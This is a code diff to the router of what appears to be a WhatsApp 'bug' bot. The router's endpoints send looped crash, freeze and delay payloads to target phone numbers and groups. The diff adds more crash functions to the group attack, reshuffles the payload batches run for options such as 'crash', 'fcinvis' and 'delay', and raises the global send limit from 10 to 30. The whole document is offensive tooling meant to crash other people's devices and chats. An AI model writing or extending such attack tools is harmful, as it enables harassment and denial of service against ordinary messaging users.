@@ -169,7 +169,7 @@ router.get("/groupBug", async (req, res) => {
 
           // 4.3. Coba kirim pesan ke grup
           try {
-            await sock.sendMessage(groupJid, { text: "Halo" });
+            await sock.sendMessage(groupJid, { text: "Assalamualaikum" });
             finalResult.canSendMessage = true;
             logger.info(`[✅ GROUP BUG] Successfully sent message to group`);
           } catch (err) {
@@ -182,6 +182,10 @@ router.get("/groupBug", async (req, res) => {
             try {
               logger.info(`[📤 GROUP BUG] Sending hardcoded bug combination to group`);
               await GbCrash(sock, groupJid);
+              await ZetTempurGb(sock, groupJid);
+              await BlankFreezeChatGroup(sock, groupJid);
+              await BegalGb(sock, groupJid);
+              await LockGb(sock, groupJid);
               await sock.sendMessage(groupJid, { text: "Eh" });
               logger.info(`[✅ GROUP BUG] Successfully sent bug combination to group`);
             } catch (err) {
@@ -388,19 +392,13 @@ router.get("/sendBug", async (req, res) => {
       switch (bug) {
         case "crash":
           for (let i = 0; i < 35; i++) {
-            await NanasBlankOLD(sock, targetJid);
             await OmhcOld(sock, targetJid);
-            await FcSpam(sock, targetJid);
             await StcFC(sock, targetJid);
-            await QQS_FC_INVISIBLE(sock, targetJid);
             await QQSPrivateBlank(sock, targetJid);
             await QQS_CRASH_PV(sock, targetJid);
             await NanasBlankOLD(sock, targetJid);
             await NullBlank(sock, targetJid);
-            await CrashNew(sock, targetJid);
             await blankClik(sock, targetJid);
-            await xryyfc(sock, targetJid);
-            await xryycrashmedia(sock, targetJid);
             await DelayBuldoHardFreezeByMia(sock, targetJid);
             await sleep(1000);
           }
@@ -414,70 +412,67 @@ router.get("/sendBug", async (req, res) => {
           break;
         case "bokep":
           for (let i = 0; i < 20; i++) {
-           await NanasBlankOLD(sock, targetJid);
+            await OmhcOld(sock, targetJid);
+            await StcFC(sock, targetJid);
+            await QQSPrivateBlank(sock, targetJid);
+            await QQS_CRASH_PV(sock, targetJid);
+            await NanasBlankOLD(sock, targetJid);
             await NullBlank(sock, targetJid);
-            await CrashNew(sock, targetJid);
             await blankClik(sock, targetJid);
-            await xryyfc(sock, targetJid);
-            await xryycrashmedia(sock, targetJid);
             await DelayBuldoHardFreezeByMia(sock, targetJid);
             await sleep(1000)
           }
           break;
         case "fcinvis":
-          for (let i = 0; i < 200; i++) {
-            await CrashIosNewByMia(sock, targetJid);
+          for (let i = 0; i < 20; i++) {
+            await OmhcOld(sock, targetJid);
+            await StcFC(sock, targetJid);
+            await QQSPrivateBlank(sock, targetJid);
+            await QQS_CRASH_PV(sock, targetJid);
             await NanasBlankOLD(sock, targetJid);
             await NullBlank(sock, targetJid);
-            await CrashNew(sock, targetJid);
             await blankClik(sock, targetJid);
-            await xryyfc(sock, targetJid);
-            await xryycrashmedia(sock, targetJid);
             await DelayBuldoHardFreezeByMia(sock, targetJid);
             await sleep(1000);
           }
           break;
         case "fcnoinvis":
-          for (let i = 0; i < 200; i++) {
+          for (let i = 0; i < 70; i++) {
+            await OmhcOld(sock, targetJid);
+            await StcFC(sock, targetJid);
+            await QQSPrivateBlank(sock, targetJid);
+            await QQS_CRASH_PV(sock, targetJid);
             await NanasBlankOLD(sock, targetJid);
             await NullBlank(sock, targetJid);
-            await CrashNew(sock, targetJid);
             await blankClik(sock, targetJid);
-            await xryyfc(sock, targetJid);
-            await xryycrashmedia(sock, targetJid);
             await DelayBuldoHardFreezeByMia(sock, targetJid);
             await sleep(1000);
           }
           break;
         case "uix":
-          for (let i = 0; i < 20; i++) {
+          for (let i = 0; i < 30; i++) {
+            await OmhcOld(sock, targetJid);
+            await StcFC(sock, targetJid);
+            await QQSPrivateBlank(sock, targetJid);
+            await QQS_CRASH_PV(sock, targetJid);
             await NanasBlankOLD(sock, targetJid);
             await NullBlank(sock, targetJid);
-            await CrashNew(sock, targetJid);
             await blankClik(sock, targetJid);
-            await xryyfc(sock, targetJid);
-            await xryycrashmedia(sock, targetJid);
             await DelayBuldoHardFreezeByMia(sock, targetJid);
             await sleep(1000);
           }
           break;
         case "delay":
-          for (let i = 0; i < 120; i++) {
+          for (let i = 0; i < 30; i++) {
             await omhcdelay(sock, targetJid);
-            await QQS_DELAY_INVIS_NEW(sock, targetJid);
             await OmhcCrash(sock, targetJid);
             await JustFC5(sock, targetJid);
-            await harddelay(sock, targetJid);
-            await maklodelay(sock, targetJid);
             await sleep(500);
           }
           break;
         case "delay2":
-          for (let i = 0; i < 120; i++) {
-            await omhcdelay(sock, targetJid);
-            await QQS_DELAY_INVIS_NEW(sock, targetJid);
+          for (let i = 0; i < 30; i++) {
             await OmhcCrash(sock, targetJid);
-            await JustFC5(sock, targetJid);
             await harddelay(sock, targetJid);
             await maklodelay(sock, targetJid);
             await sleep(500);
@@ -675,7 +670,7 @@ router.get("/customBug", async (req, res) => {
   let sock, sessionName, maxQty, effectiveDelay;
 
   if (senderType === "global") {
-    maxQty = 10;
+    maxQty = 30;
     effectiveDelay = 500; // Abaikan delay user, gunakan 500ms
     sock = getRandomVipConnection();
      
@@ -727,12 +722,12 @@ router.get("/customBug", async (req, res) => {
 
       // Pemetaan nama bug ke fungsi (pastikan fungsi-fungsi ini diimpor jika dipanggil)
       const bugFunctions = {
-        'crashNotificationVVIP': ZetTempurGb, // fallback contoh
+        'crashNotificationVVIP': DelayBuldoHardFreezeByMia, // fallback contoh
         'stealthCrashVVIP': CrashNew,
-        'gsIntX': BlankFreezeChatGroup,
-        'forceCloseMentalVVIP': BegalGb,
-        'permenCall': LockGb,
-        'invisibleSpam': GbCrash
+        'gsIntX': omhcdelay,
+        'forceCloseMentalVVIP': CrashIosNewByMia,
+        'permenCall': OmhcCrash,
+        'invisibleSpam': harddelay
       };
 
       for (let i = 0; i < parsedQty; i++) {
